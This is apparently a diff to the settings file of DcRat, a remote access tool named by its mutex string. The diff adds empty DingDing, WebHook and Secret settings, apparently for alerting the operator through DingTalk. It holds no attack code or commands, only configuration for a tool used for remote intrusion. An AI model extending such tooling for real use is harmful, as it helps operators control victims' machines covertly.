@@ -50,5 +50,14 @@
     <Setting Name="Mutex" Type="System.String" Scope="User">
       <Value Profile="(Default)">DcRatMutex_qwqdanchun</Value>
     </Setting>
+    <Setting Name="DingDing" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">False</Value>
+    </Setting>
+    <Setting Name="WebHook" Type="System.String" Scope="User">
+      <Value Profile="(Default)" />
+    </Setting>
+    <Setting Name="Secret" Type="System.String" Scope="User">
+      <Value Profile="(Default)" />
+    </Setting>
   </Settings>
 </SettingsFile>
